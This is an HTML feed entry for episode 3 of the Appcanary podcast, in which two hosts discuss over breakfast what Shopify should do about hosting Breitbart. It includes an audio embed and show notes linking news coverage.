    <content type="html">&lt;p&gt;Here in episode 3, Max and Phill discuss, over breakfast, what Shopify should or should not do with regard to Breitbart. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;.&lt;/p&gt;

&lt;audio controls preload="none" style="width: 100%;"&gt;
    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep3.mp3" type="audio/mpeg"&gt;
    Your browser does not support the audio element.
&lt;/audio&gt;

&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="http://www.cbc.ca/news/canada/ottawa/shopify-ceo-tobi-lutke-defends-decision-to-host-breitbart-1.3973798"&gt;Shopify CEO digs in against Breitbart backlash&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.inc.com/sonya-mann/trump-shopify/breitbart.html"&gt;Shopify Backlash Shows Even Second-Degree Trump Ties Can Be Trouble&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
  </entry>
</feed>
